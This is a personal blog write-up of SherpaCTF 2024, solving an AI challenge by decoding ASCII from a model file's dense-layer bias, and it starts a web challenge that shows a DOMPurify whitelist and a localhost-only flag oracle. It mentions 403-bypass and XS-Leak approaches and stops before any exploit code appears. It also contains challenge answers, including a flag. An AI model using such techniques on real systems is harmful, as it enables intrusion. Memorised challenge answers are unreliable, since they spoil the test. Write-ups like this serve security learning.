---
title: 'SherpaCTF 2024 Writeup'
date: 2024-11-26 00:59:38
categories: Write-Up
author: w0rmhol3
tags: CTF
cover: https://raw.githubusercontent.com/w0rmhol3/w0rmhol3-Blog/main/source/_img/SherpaCTF/sherpa_logo.png?raw=true
---
SherpaCTF 2024 was the only CTF that I had joined in 2024, and to my surprise, also my first 24 hours on-site CTF. Being a graduate had decreased the opportunity for me participate in physical CTFs, but finally Sherpasec had given me one CTF to play this year. The organizers of this CTF is the members from Sherpasec community, which consists of students, fresh graduates, and also seasoned experts. Aside from that, the challenge creators team are built from seasoned players that had mad experience, some are the challenge creators of wargames.my, and some of them are crazy talented students, and every single one of them created challenges based on their expertise. It was one of the most challenging and fun CTF that I had joined <!--more--> 

This CTF had included an element from hackathons, in which after the CTF had ended, instead of submitting your writeup, you need to do a presentation of 2 challenges you solved of your choice. This is a different experience as compared to other CTFs, where you just cincai settle your writeup and just ~end up getting disqualified~ submit it.

Our team, M53_TeaBag, had not only secured the Champion Title for the Open category, but also the best creative presentation award. We boys literally went from being the last team to set up our laptops for the CTF, to winning them breads :D

So here I go, sharing my writeup for the challenges I solved SherpaCTF2024.

# AI: Deepfake

I’m not fond of AI but this challenge was created by my boy in X3 Security, and its a 24 hours CTF, so why not look into it.

![Deepfake](https://raw.githubusercontent.com/w0rmhol3/w0rmhol3-Blog/main/source/_img/SherpaCTF/image.png?raw=true)

This AI showcases its skill to detect fake ai images. Initially I have no idea on what to do or what it is. It took me awhile to look up for what a .h5 file is and what can we do with it.

![h5 Explanation](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%201.png?raw=true)

Initially i found the challenge creator’s [linkedin](https://www.linkedin.com/in/roheender-sahota/) post regarding this [blog](https://huggingface.co/MaanVad3r/DeepFake-Detector). 


Everyone including myself was trying to setup tensorflow in order to run the AI. But my group member made me realized, if its the same tool that was posted about, there shouldn’t be much different, in which we don’t think there’s a way for the tool to output the flag.

Hence I start looking into how to view the datasets within the h5 file. I gpt-ed a lot. A LOT. But uh, since it’s company’s property, I just used temporary chat mode so that they don’t find out I spammed their premium answer giver.

So, the first step is look into what layers (weight) are within the h5 files. Hence, gpt giving me

Layers.py:

```python
# Open the .h5 file
file_path = 'file.h5'
with h5py.File(file_path, 'r') as h5file:
    # List all groups (main layers, model structure)
    print("Keys in the file:")
    for key in h5file.keys():
        print(key)

    # If the file has a 'model_weights' group
    if 'model_weights' in h5file:
        print("\nModel Weights Group:")
        model_weights = h5file['model_weights']
        for layer in model_weights.keys():
            print(layer)
```

layers output:

```python
Keys in the file:
model_weights
optimizer_weights

Model Weights Group:
batch_normalization
batch_normalization_1
batch_normalization_2
conv2d
conv2d_1
conv2d_2
dense
dense_1
dropout
flatten
max_pooling2d
max_pooling2d_1
max_pooling2d_2
re_lu
re_lu_1
re_lu_2
top_level_model_weights
```

From the script, basically it identifies the weights that are within the h5 files and returns it to the user. The next step of solving this challenge is to look into the data of the layers.

For this part of the challenge, i ran another script before, that almost crashed the terminal in my vm (printing out all data in all weights 🤤). 

My initial solution = reveal everything + grep for flag.

 So i’ll just give you the script that actually look into the layer that has the flag.
import.py:

```python
import h5py

def extract_dense_layer_data(file_path, layer_name="dense"):

    dense_data = {}

    with h5py.File(file_path, 'r') as h5_file:
        def find_dense_layer(group, path=""):
            for key in group:
                current_item = group[key]
                current_path = f"{path}/{key}" if path else key
                if isinstance(current_item, h5py.Group):                    
                    find_dense_layer(current_item, current_path)
                elif layer_name in current_path.lower():    
                    dense_data[current_path] = current_item[()]

        find_dense_layer(h5_file)

    return dense_data

file_path = "file.h5" 
dense_layer_data = extract_dense_layer_data(file_path)

for key, value in dense_layer_data.items():
    print(f"Dense layer path: {key}")
    print(f"Data:\n{value}\n")
```

output:

```python
Dense layer path: model_weights/dense/dense/bias:0
Data:
[ 8.29965439e+01  7.19965057e+01  6.69971008e+01  8.39961624e+01
  6.99971619e+01  4.99974022e+01  5.19976273e+01  1.22993637e+02
  7.19956436e+01  1.04994408e+02  9.99970551e+01  9.99954300e+01
  5.09975548e+01  1.09994354e+02  9.49954529e+01  1.04995102e+02
  1.09994469e+02  9.49948730e+01  8.39966202e+01  1.03995239e+02
  5.09968300e+01  9.49958649e+01  7.59957886e+01  9.69953079e+01
  1.20993927e+02  5.09971848e+01  1.13994812e+02  1.14993843e+02
  1.24994354e+02 -6.00270636e-04 -1.41949276e-04 -2.03450720e-04
 -3.72607174e-04 -1.72451619e-04 -4.57197515e-04 -9.26262510e-05
 -1.89735831e-04 -1.14099414e-04 -6.00109808e-04 -1.74669956e-04
 -7.46769714e-04 -4.12625173e-04 -1.79406386e-04 -3.75634736e-05
 -9.21693631e-04 -6.00446423e-04 -5.38686058e-04 -6.00210042e-04
 -5.97809150e-04 -6.00477215e-04 -5.15952124e-04 -6.00388390e-04
 -4.42364864e-04 -8.40347959e-04 -6.47099223e-05 -1.88008547e-04
 -3.92254151e-04 -2.65870971e-04 -6.00457890e-04 -1.95682092e-04
 -5.95788937e-04 -5.31253114e-04  1.44400590e-04 -5.19354420e-04
 -4.65223129e-04 -7.70417391e-04 -6.00500207e-04 -2.54245067e-04
 -5.98740473e-04 -5.94640442e-04 -4.65372752e-04 -5.18912624e-04
 -6.00438565e-04 -9.78440279e-04 -1.84887933e-04 -1.28934043e-04
 -1.59630828e-04 -1.40265911e-04  7.73965512e-05 -8.17133347e-04
 -5.99404098e-04 -7.96116306e-04 -2.19996975e-04 -5.99818653e-04
 -2.06670506e-04 -2.47556047e-04 -7.76606321e-05 -5.42573747e-04
 -3.49562353e-04 -3.21678119e-04 -5.98716608e-04 -6.00060041e-04
 -8.45809176e-04 -5.99081570e-04 -5.99945488e-04 -5.99722727e-04
 -5.99868305e-04 -2.98030209e-04 -5.73707395e-04 -4.38463379e-04
 -1.74188885e-04 -8.31757323e-04 -6.92359929e-04 -6.00433268e-04
  5.87044524e-05 -8.06546013e-04 -6.78003184e-04 -6.00372325e-04
 -3.98846896e-05 -3.22680193e-04 -7.52358173e-05 -4.76259476e-04
 -4.81835654e-04 -5.97843202e-04 -7.52498163e-05 -8.40025314e-04
 -6.00470754e-04  1.70124593e-04 -5.88121999e-04 -3.38064187e-04
 -5.99597406e-04 -6.00319996e-04 -1.30807108e-04 -3.70649796e-04
 -7.33644483e-05 -6.00060157e-04 -2.44222843e-04 -8.68712028e-04
 -8.46593291e-04 -7.67221674e-04 -1.40025528e-04 -3.52915580e-04
 -3.29180475e-04 -5.99657767e-04 -6.00223488e-04 -4.79689916e-04
 -2.24965712e-04 -3.04856134e-04  1.03807838e-06 -6.71105692e-04
 -2.03907883e-04 -4.85369994e-04 -5.98912884e-04 -6.00384432e-04
  7.83096937e-07 -1.70794447e-04 -6.00428204e-04 -3.60425474e-04
 -6.00140193e-04 -5.15174215e-05 -5.98804967e-04 -6.66127307e-05
 -3.09009803e-04 -5.99776860e-04 -8.39113200e-04 -5.64918970e-04
 -5.90804091e-04 -1.81817784e-04 -5.84225170e-04 -2.46809668e-05
 -3.49101232e-04 -7.96165608e-04 -8.69784417e-05  8.02467330e-05
 -3.31732474e-04 -2.99039559e-04 -6.59071375e-04 -6.00214000e-04
 -5.54933387e-04 -5.99945313e-04  2.77863255e-05 -5.99961495e-04
 -6.00436877e-04 -5.95901569e-04 -3.60601669e-04 -5.99306542e-04
  5.45726143e-05 -2.10702696e-04 -1.44596168e-04  4.23619495e-05
 -4.91885621e-05 -5.99813357e-04 -2.11325387e-04 -6.00258296e-04
 -1.56820228e-04 -3.48921400e-04 -4.78667615e-04 -8.01686198e-04
 -3.79312405e-04 -5.99585415e-04 -2.79302447e-04 -3.62542225e-04
 -5.24522620e-04  8.84276305e-05 -1.51552202e-04  8.47518095e-06
 -5.68999676e-04 -7.32980436e-04  9.57801822e-05 -7.75287801e-04
 -7.54335953e-04 -6.90405213e-05 -4.52123786e-05 -1.23283477e-04
 -1.24951403e-04 -1.28597865e-04 -7.23113073e-04 -5.15869469e-04
 -2.48827098e-04 -8.06516211e-04 -4.75589564e-04 -6.00419473e-04
 -4.09701781e-04 -3.37647332e-04 -5.34822058e-04 -6.00181986e-04
 -1.84631863e-04 -5.21999085e-04 -8.79831146e-04 -1.73562599e-04
 -4.62003489e-04  7.63267599e-05 -7.62554642e-04 -6.00257656e-04
 -4.43446741e-04 -6.00125582e-04 -2.55314109e-04 -5.99409803e-04
 -6.00374246e-04 -5.99773368e-04 -2.42249240e-04 -4.99326852e-04
 -3.18771083e-04 -7.74797518e-04 -2.82385445e-04 -6.54375472e-04
 -2.18847243e-04 -4.38438350e-04 -3.06596630e-04 -2.63558410e-04
 -4.33833018e-04 -5.95422171e-04 -5.51177771e-04 -5.99424471e-04
 -5.98862942e-04 -5.97022707e-04 -2.16280649e-04 -8.09425663e-04
 -1.11419809e-04 -5.61031338e-04 -8.69288400e-04 -2.93936580e-04
 -3.00758547e-04 -3.56797973e-04 -5.99670457e-04 -5.85008762e-04
 -4.23114398e-05 -6.00127329e-04 -3.04394896e-04 -3.87059001e-04
 -1.62158976e-04  3.78310833e-05 -5.99613122e-04 -6.00447995e-04
 -4.15606686e-04 -6.00924541e-04 -4.99585178e-04 -5.60575718e-05
 -5.89610660e-04 -4.62441298e-04 -5.98725863e-04 -4.29492618e-04
 -2.08125421e-04 -1.61174030e-04  7.62781638e-05 -8.76696795e-05
 -6.00452826e-04 -1.35004684e-05 -6.00345898e-04 -1.08759807e-04
 -9.34964337e-04 -6.00235828e-04 -6.00250263e-04 -7.05150480e-04
 -6.66249252e-04 -1.02650949e-04 -9.46757064e-05 -2.26673073e-04
 -5.89797390e-04 -1.40166776e-06 -6.00206200e-04 -5.98422252e-04
 -6.00439147e-04 -1.50741744e-06 -5.99798630e-04 -5.04326657e-04
 -6.00400497e-04  2.23740441e-04 -1.38734962e-04 -3.06522299e-04
 -2.43927243e-05 -1.98370151e-04 -5.55572100e-04 -7.88201141e-05
 -8.81519460e-04  1.09199478e-04 -2.03499731e-04 -6.00391300e-04
 -6.03301523e-05 -4.97556990e-04 -3.88982211e-04  4.64918885e-05
 -3.89664812e-04 -7.25379796e-04 -2.07317949e-04 -6.54080475e-04
 -6.00196829e-04 -1.03692990e-04 -1.60023337e-04  1.89604267e-04
 -8.47415882e-04 -6.01344334e-04 -5.98689599e-04 -5.34434279e-04
 -7.88518460e-04 -5.55440201e-04 -6.60309393e-04 -8.42976500e-04
 -7.83589086e-04 -4.35596565e-04 -6.12466247e-05 -5.99842926e-04
 -2.77568382e-04 -4.39104217e-04 -5.34555817e-04 -5.98981511e-04
 -6.44219017e-06 -3.34947144e-05 -6.00023777e-04 -5.55576233e-04
 -6.00045372e-04 -6.00195781e-04 -5.87239745e-04 -4.66956291e-04
 -6.00144442e-04 -1.08626590e-03 -5.55563078e-04 -3.18417529e-04
 -6.00154162e-04 -7.49361410e-04 -5.12457045e-04  1.81079631e-05
 -3.93679424e-04 -2.14617339e-05 -3.51464114e-04 -2.29072524e-04
 -1.05729490e-03 -5.55400911e-04 -6.84404629e-04  6.47921752e-06
 -4.97980036e-05 -1.96907815e-04 -5.76454739e-04 -5.41399757e-04
 -6.00418134e-04 -1.99450471e-04 -5.82583831e-04 -8.10525788e-04
 -1.80059957e-04 -1.23178455e-04 -5.98947692e-04 -5.99318242e-04
 -3.01441207e-04 -5.97365259e-04 -1.44708320e-04 -1.34180635e-04
 -7.50785111e-04 -2.11932333e-04 -3.58693433e-05  8.31628950e-06
 -6.00185827e-04 -7.68112950e-04 -6.00015570e-04 -5.77755447e-04
 -9.08112997e-05 -6.00098050e-04 -2.39781017e-04 -6.00449624e-04
 -2.36840660e-05 -5.15331049e-04 -6.00494037e-04  2.44473049e-05
 -6.81534235e-04 -1.76972444e-05 -6.75302465e-04 -5.99941704e-04
 -6.31892704e-04 -5.99990133e-04 -8.23846669e-04 -4.47015802e-04
  3.30504088e-04 -5.99980704e-04 -6.00482046e-04 -4.54105058e-04
 -1.23597012e-04 -4.79310023e-04 -3.03440920e-05 -3.81133141e-04
 -2.13552819e-04 -2.87481234e-04 -5.99816791e-04 -6.00259285e-04
 -6.80046331e-04 -5.96969854e-04  2.92241566e-05 -6.96138130e-04
 -6.00376516e-04 -8.38987413e-04 -5.99279010e-04 -2.41081580e-04
 -1.62212658e-04  3.54934091e-05 -4.19727672e-04 -2.16388347e-04
  4.89612576e-05 -5.99655672e-04 -8.35097570e-04 -5.99663821e-04
  2.85352347e-04 -5.26525264e-06 -6.00463769e-04 -3.12234217e-04
 -4.20365104e-04 -4.47648374e-04 -5.99836814e-04 -6.36031677e-04
 -8.94182944e-04 -7.63561402e-04 -3.88943212e-04  4.75602501e-05
 -3.03806417e-04 -2.14239990e-04 -6.00083207e-04 -1.97088317e-04
 -1.71438410e-06 -2.26931152e-04 -5.24604766e-05 -1.74908884e-04
 -5.99934661e-04 -3.42384942e-06 -2.72425998e-04 -5.51430450e-04
 -4.85000288e-04 -5.66256116e-04 -2.69814831e-04 -6.83782040e-04
 -8.41236732e-04  6.53425232e-05 -5.99432620e-04 -6.15492405e-04
 -6.00222207e-04 -1.66497033e-04 -1.29777007e-04 -7.24152196e-04
 -5.15262829e-04 -5.99925930e-04 -5.94442827e-04 -4.54246241e-04
 -4.52767650e-04 -2.12763975e-04  3.40732193e-04 -5.33771527e-04
 -8.02036782e-04 -1.39019307e-04 -1.23895574e-04 -5.99430525e-04
 -5.91902644e-04 -6.00368832e-04 -7.15254631e-04 -5.99765743e-04
 -4.21063771e-04 -6.00649684e-04 -6.00385945e-04 -6.02559594e-04
 -9.43303108e-04 -8.33645929e-04 -7.40095915e-04 -6.00394211e-04
 -5.73287311e-04 -5.99258929e-04 -7.61107774e-04 -5.34153834e-04
 -5.95595338e-04 -6.00438216e-04 -1.72453481e-04 -2.84839305e-04
 -6.00409578e-04 -5.99511550e-04 -6.00464118e-04 -2.19953698e-04
  4.20122888e-05 -3.03599169e-04 -3.06086702e-04 -6.00470055e-04
 -7.81033945e-04 -5.99191058e-04 -5.93799108e-04 -9.94300237e-04
 -7.15239803e-05 -3.53019859e-04 -4.87106619e-04 -5.99616673e-04]

#This one also cut short, but the ones displayed here is where the flag is...
```

So you think, hmm what did i just get? a bunch of decimal points, what to do?

The final step of this challenge is to convert the decimal points into ascii using numpy library. GPT POWERRRRR

round.py:

```python
import numpy as np

# I manually paste the data here 
data = np.array([8.29965439e+01, 7.19965057e+01, 6.69971008e+01, 8.39961624e+01, 6.99971619e+01, 4.99974022e+01, 5.19976273e+01, 1.22993637e+02, 7.19956436e+01, 1.04994408e+02, 9.99970551e+01, 9.99954300e+01, 5.09975548e+01, 1.09994354e+02, 9.49954529e+01, 1.04995102e+02, 1.09994469e+02, 9.49948730e+01, 8.39966202e+01, 1.03995239e+02, 5.09968300e+01, 9.49958649e+01, 7.59957886e+01, 9.69953079e+01, 1.20993927e+02, 5.09971848e+01, 1.13994812e+02, 1.14993843e+02, 1.24994354e+02, -6.00270636e-04, -1.41949276e-04, -2.03450720e-04, -3.72607174e-04, -1.72451619e-04, -4.57197515e-04, -9.26262510e-05, -1.89735831e-04, -1.14099414e-04, -6.00109808e-04, -1.74669956e-04, -7.46769714e-04, -4.12625173e-04, -1.79406386e-04, -3.75634736e-05, -9.21693631e-04, -6.00446423e-04, -5.38686058e-04, -6.00210042e-04, -5.97809150e-04, -6.00477215e-04, -5.15952124e-04, -6.00388390e-04, -4.42364864e-04, -8.40347959e-04, -6.47099223e-05, -1.88008547e-04, -3.92254151e-04, -2.65870971e-04, -6.00457890e-04, -1.95682092e-04, -5.95788937e-04, -5.31253114e-04, 1.44400590e-04, -5.19354420e-04, -4.65223129e-04, -7.70417391e-04, -6.00500207e-04, -2.54245067e-04, -5.98740473e-04, -5.94640442e-04, -4.65372752e-04, -5.18912624e-04, -6.00438565e-04, -9.78440279e-04, -1.84887933e-04, -1.28934043e-04, -1.59630828e-04, -1.40265911e-04, 7.73965512e-05, -8.17133347e-04, -5.99404098e-04, -7.96116306e-04, -2.19996975e-04, -5.99818653e-04, -2.06670506e-04, -2.47556047e-04, -7.76606321e-05, -5.42573747e-04, -3.49562353e-04, -3.21678119e-04, -5.98716608e-04, -6.00060041e-04, -8.45809176e-04, -5.99081570e-04, -5.99945488e-04, -5.99722727e-04, -5.99868305e-04, -2.98030209e-04, -5.73707395e-04, -4.38463379e-04, -1.74188885e-04, -8.31757323e-04, -6.92359929e-04, -6.00433268e-04, 5.87044524e-05, -8.06546013e-04, -6.78003184e-04, -6.00372325e-04, -3.98846896e-05, -3.22680193e-04, -7.52358173e-05, -4.76259476e-04, -4.81835654e-04, -5.97843202e-04, -7.52498163e-05, -8.40025314e-04, -6.00470754e-04, 1.70124593e-04, -5.88121999e-04, -3.38064187e-04, -5.99597406e-04, -6.00319996e-04, -1.30807108e-04, -3.70649796e-04, -7.33644483e-05, -6.00060157e-04, -2.44222843e-04, -8.68712028e-04, -8.46593291e-04, -7.67221674e-04, -1.40025528e-04, -3.52915580e-04, -3.29180475e-04, -5.99657767e-04, -6.00223488e-04, -4.79689916e-04, -2.24965712e-04, -3.04856134e-04, 1.03807838e-06, -6.71105692e-04, -2.03907883e-04, -4.85369994e-04, -5.98912884e-04, -6.00384432e-04, 7.83096937e-07, -1.70794447e-04, -6.00428204e-04, -3.60425474e-04, -6.00140193e-04, -5.15174215e-05, -5.98804967e-04, -6.66127307e-05, -3.09009803e-04, -5.99776860e-04, -8.39113200e-04, -5.64918970e-04, -5.90804091e-04, -1.81817784e-04, -5.84225170e-04, -2.46809668e-05, -3.49101232e-04, -7.96165608e-04, -8.69784417e-05, 8.02467330e-05, -3.31732474e-04, -2.99039559e-04, -6.59071375e-04, -6.00214000e-04, -5.54933387e-04, -5.99945313e-04, 2.77863255e-05, -5.99961495e-04, -6.00436877e-04, -5.95901569e-04, -3.60601669e-04, -5.99306542e-04, 5.45726143e-05, -2.10702696e-04, -1.44596168e-04, 4.23619495e-05, -4.91885621e-05, -5.99813357e-04, -2.11325387e-04, -6.00258296e-04, -1.56820228e-04, -3.48921400e-04, -4.78667615e-04, -8.01686198e-04, -3.79312405e-04, -5.99585415e-04, -2.79302447e-04, -3.62542225e-04, -5.24522620e-04, 8.84276305e-05, -1.51552202e-04, 8.47518095e-06, -5.68999676e-04, -7.32980436e-04, 9.57801822e-05, -7.75287801e-04, -7.54335953e-04, -6.90405213e-05, -4.52123786e-05, -1.23283477e-04, -1.24951403e-04, -1.28597865e-04, -7.23113073e-04, -5.15869469e-04, -2.48827098e-04, -8.06516211e-04, -4.75589564e-04, -6.00419473e-04, -4.09701781e-04, -3.37647332e-04, -5.34822058e-04, -6.00181986e-04, -1.84631863e-04, -5.21999085e-04, -8.79831146e-04, -1.73562599e-04, -4.62003489e-04, 7.63267599e-05, -7.62554642e-04, -6.00257656e-04, -4.43446741e-04, -6.00125582e-04, -2.55314109e-04, -5.99409803e-04, -6.00374246e-04, -5.99773368e-04, -2.42249240e-04, -4.99326852e-04, -3.18771083e-04, -7.74797518e-04, -2.82385445e-04, -6.54375472e-04, -2.18847243e-04, -4.38438350e-04, -3.06596630e-04, -2.63558410e-04, -4.33833018e-04, -5.95422171e-04, -5.51177771e-04, -5.99424471e-04, -5.98862942e-04, -5.97022707e-04, -2.16280649e-04, -8.09425663e-04, -1.11419809e-04, -5.61031338e-04, -8.69288400e-04, -2.93936580e-04, -3.00758547e-04, -3.56797973e-04, -5.99670457e-04, -5.85008762e-04, -4.23114398e-05, -6.00127329e-04, -3.04394896e-04, -3.87059001e-04, -1.62158976e-04, 3.78310833e-05, -5.99613122e-04, -6.00447995e-04, -4.15606686e-04, -6.00924541e-04, -4.99585178e-04, -5.60575718e-05, -5.89610660e-04, -4.62441298e-04, -5.98725863e-04, -4.29492618e-04, -2.08125421e-04, -1.61174030e-04, 7.62781638e-05, -8.76696795e-05, -6.00452826e-04, -1.35004684e-05, -6.00345898e-04, -1.08759807e-04, -9.34964337e-04, -6.00235828e-04, -6.00250263e-04, -7.05150480e-04, -6.66249252e-04, -1.02650949e-04, -9.46757064e-05, -2.26673073e-04, -5.89797390e-04, -1.40166776e-06, -6.00206200e-04, -5.98422252e-04, -6.00439147e-04, -1.50741744e-06, -5.99798630e-04, -5.04326657e-04, -6.00400497e-04, 2.23740441e-04, -1.38734962e-04, -3.06522299e-04, -2.43927243e-05, -1.98370151e-04, -5.55572100e-04, -7.88201141e-05, -8.81519460e-04, 1.09199478e-04, -2.03499731e-04, -6.00391300e-04, -6.03301523e-05, -4.97556990e-04, -3.88982211e-04, 4.64918885e-05, -3.89664812e-04, -7.25379796e-04, -2.07317949e-04, -6.54080475e-04, -6.00196829e-04, -1.03692990e-04, -1.60023337e-04, 1.89604267e-04, -8.47415882e-04, -6.01344334e-04, -5.98689599e-04, -5.34434279e-04, -7.88518460e-04, -5.55440201e-04, -6.60309393e-04, -8.42976500e-04, -7.83589086e-04, -4.35596565e-04, -6.12466247e-05, -5.99842926e-04, -2.77568382e-04, -4.39104217e-04, -5.34555817e-04, -5.98981511e-04, -6.44219017e-06, -3.34947144e-05, -6.00023777e-04, -5.55576233e-04, -6.00045372e-04, -6.00195781e-04, -5.87239745e-04, -4.66956291e-04, -6.00144442e-04, -1.08626590e-03, -5.55563078e-04, -3.18417529e-04, -6.00154162e-04, -7.49361410e-04, -5.12457045e-04, 1.81079631e-05, -3.93679424e-04, -2.14617339e-05, -3.51464114e-04, -2.29072524e-04, -1.05729490e-03, -5.55400911e-04, -6.84404629e-04, 6.47921752e-06, -4.97980036e-05, -1.96907815e-04, -5.76454739e-04, -5.41399757e-04, -6.00418134e-04, -1.99450471e-04, -5.82583831e-04, -8.10525788e-04, -1.80059957e-04, -1.23178455e-04, -5.98947692e-04, -5.99318242e-04, -3.01441207e-04, -5.97365259e-04, -1.44708320e-04, -1.34180635e-04, -7.50785111e-04, -2.11932333e-04, -3.58693433e-05, 8.31628950e-06, -6.00185827e-04, -7.68112950e-04, -6.00015570e-04, -5.77755447e-04, -9.08112997e-05, -6.00098050e-04, -2.39781017e-04, -6.00449624e-04, -2.36840660e-05, -5.15331049e-04, -6.00494037e-04, 2.44473049e-05, -6.81534235e-04, -1.76972444e-05, -6.75302465e-04, -5.99941704e-04, -6.31892704e-04, -5.99990133e-04, -8.23846669e-04, -4.47015802e-04, 3.30504088e-04, -5.99980704e-04, -6.00482046e-04, -4.54105058e-04, -1.23597012e-04, -4.79310023e-04, -3.03440920e-05, -3.81133141e-04, -2.13552819e-04, -2.87481234e-04, -5.99816791e-04, -6.00259285e-04, -6.80046331e-04, -5.96969854e-04, 2.92241566e-05, -6.96138130e-04, -6.00376516e-04, -8.38987413e-04, -5.99279010e-04, -2.41081580e-04, -1.62212658e-04, 3.54934091e-05, -4.19727672e-04, -2.16388347e-04, 4.89612576e-05, -5.99655672e-04, -8.35097570e-04, -5.99663821e-04, 2.85352347e-04, -5.26525264e-06, -6.00463769e-04, -3.12234217e-04, -4.20365104e-04, -4.47648374e-04, -5.99836814e-04, -6.36031677e-04, -8.94182944e-04, -7.63561402e-04, -3.88943212e-04, 4.75602501e-05, -3.03806417e-04, -2.14239990e-04, -6.00083207e-04, -1.97088317e-04, -1.71438410e-06, -2.26931152e-04, -5.24604766e-05, -1.74908884e-04, -5.99934661e-04, -3.42384942e-06, -2.72425998e-04, -5.51430450e-04, -4.85000288e-04, -5.66256116e-04, -2.69814831e-04, -6.83782040e-04, -8.41236732e-04, 6.53425232e-05, -5.99432620e-04, -6.15492405e-04, -6.00222207e-04, -1.66497033e-04, -1.29777007e-04, -7.24152196e-04, -5.15262829e-04, -5.99925930e-04, -5.94442827e-04, -4.54246241e-04, -4.52767650e-04, -2.12763975e-04, 3.40732193e-04, -5.33771527e-04, -8.02036782e-04, -1.39019307e-04, -1.23895574e-04, -5.99430525e-04, -5.91902644e-04, -6.00368832e-04, -7.15254631e-04, -5.99765743e-04, -4.21063771e-04, -6.00649684e-04, -6.00385945e-04, -6.02559594e-04, -9.43303108e-04, -8.33645929e-04, -7.40095915e-04, -6.00394211e-04, -5.73287311e-04, -5.99258929e-04, -7.61107774e-04, -5.34153834e-04, -5.95595338e-04, -6.00438216e-04, -1.72453481e-04, -2.84839305e-04, -6.00409578e-04, -5.99511550e-04, -6.00464118e-04, -2.19953698e-04, 4.20122888e-05, -3.03599169e-04, -3.06086702e-04, -6.00470055e-04, -7.81033945e-04, -5.99191058e-04, -5.93799108e-04, -9.94300237e-04, -7.15239803e-05, -3.53019859e-04, -.87106619e-04, -5.99616673e-04])

# Round to nearest integer
rounded_data = np.round(data).astype(int)

# Convert to ASCII characters
ascii_chars = ''.join(chr(value) for value in rounded_data)

print(f"ASCII String: {ascii_chars}")
```

Run script = Get flag:

![flag](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%202.png?raw=true)

So what I’ve learn:

Analyzing and understanding a h5 file = There are multiple layers/weights in a h5 file that stores data in decimals that actually the data sets. Flag is just where it can be hidden together with the data sets.

Flag: SHCTF24{Hidd3n_in_Th3_Lay3rs}

# WEB: Oshawott As A Service (OAAS)

![OAAS](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%203.png?raw=true)

This challenge was created by the client side attack legend: ViceVirus a.k.a Firdaus. I know, you know, everyone knows this isn’t going to be just another CTF challenge as the name appears.  

Like his interest, this will never be just another guessy black box challenge, source code was given with a Pokemon theme to entertain everyone.  

![Index Page](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%204.png?raw=true)

The first look into the challenge index page is directly a form to be submitted. The part of source code is shown below:

```js
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'html', 'index.html'));
});

// Post comments
app.post('/comment', async (req, res) => {
    const { comment, image } = req.body;
    if (!comment || !image) {
        return res.status(400).json({ error: 'Comment and image are required' });
    }

    // Super strong anti-XSS mechanism
    const sanitizedComment = DOMPurify.sanitize(comment, getSanitizeOptions());
    const sanitizedImage = DOMPurify.sanitize(image, getSanitizeOptions());
    const hash = createHash(`${sanitizedComment}${sanitizedImage}`);
    const sql = 'INSERT INTO comments (comment, image, hash) VALUES (?, ?, ?)';

    try {
        const { lastID } = await db.run(sql, [sanitizedComment, sanitizedImage, hash]);
        res.json({ message: 'Comment added successfully', commentId: lastID, hash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
```

He had implemented anti-xss mechanism with a function `getSanitizeOptions()` within the comment form field. So let’s look into what is that

```js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

// Create a DOM window for DOMPurify
const { window } = new JSDOM('');
const DOMPurify = createDOMPurify(window);

function getSanitizeOptions() {
    return {
        ADD_TAGS: [
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'div', 'span', 'a', 'img',
            'object', 'ul', 'ol', 'li', 'table', 'tr', 'td', 'th', 'blockquote',
            'code', 'pre', 'br', 'hr', 'em', 'strong', 'u', 'i', 'b', 'sub', 'sup',
            'small', 'abbr', 'address', 'article', 'aside', 'audio', 'canvas', 'figcaption',
            'figure', 'footer', 'header', 'nav', 'section', 'time', 'video'
        ],
        ADD_ATTR: [
            'href', 'src', 'alt', 'title', 'width', 'height', 'data', 'cite', 'datetime',
            'class', 'id', 'name', 'role', 'aria-labelledby', 'aria-describedby', 'aria-hidden',
            'aria-live', 'aria-controls', 'aria-expanded', 'aria-haspopup', 'aria-pressed', 'aria-checked',
            'aria-valuemin', 'aria-valuemax', 'aria-valuenow', 'aria-orientation', 'aria-owns', 'aria-label'
        ],
    };
}

module.exports = { getSanitizeOptions, DOMPurify };

```

Now that is a headache…. Not a blacklist but a whitelist of the only tags and attribute that can be used. damn. 

While at that, I was also looking up and kept on trying to exploit this challenge through XSS. It was not that, I’ve been trying to trigger alert() through all these tags and attribute, but really it just doesn’t make sense that any of these attribute would help with triggering it.

So tags and attribute what else can make this more complex?

```js
// Flag finder
app.get('/oshaoshaflagfinder', (req, res) => {
    const remoteIP = req.socket.remoteAddress;

    if (remoteIP === '::ffff:127.0.0.1' || remoteIP === '::1' || remoteIP === '127.0.0.1') {
        const { flag } = req.query;
        const expectedFlag = 'SHCTF24{FAKE_FLAG!}';
        if (!flag) {
            return res.status(404).send('No');
        }

        let isValid = true;
        for (let i = 0; i < flag.length; i++) {
            if (flag[i] !== expectedFlag[i] || !fs.existsSync(path.join(imagePath, `${flag[i]}.png`))) {
                isValid = false;
                break;
            }
        }

        res.status(isValid ? 200 : 404).send(isValid ? 'Yes' : 'No');

    } else {
        return res.status(403).send(`You are not allowed to access this resource...`);
    }

});
```

Wow this code looks like an 403 bypass challenge where u can just find a request header that can modify your header into [localhost](http://localhost) and go get the flag 😃 like from hacktricks:

![Hacktricks Cheatsheet](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%205.png?raw=true)

**SIKE:** no, if its that easy this challenge would be rated easy from him already. 

…..also that’s literally what i did for 2 hours, looking to bypass 403… so yea 🥴

 After 5 hours of 0% progress, i took a break from this challenge and help the other members with their challenge.   

So like 8pm - 10pm we went out to have some chill time, eat and talk shet. 

After dinner time, the crew decided to drop some hint (XS Leak, a legendary web player.) So me wasted my time looking into wrong exploits for the challenge, I just messaged vicevirus cuz I know he just landed a few hours ago (shoutout to his team winning 3rd in ACS woohoo) but damn I know he would enjoy being here seeing me & Fedwig suffer with his challenge.

![Convo with the legend](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%206.png?raw=true)

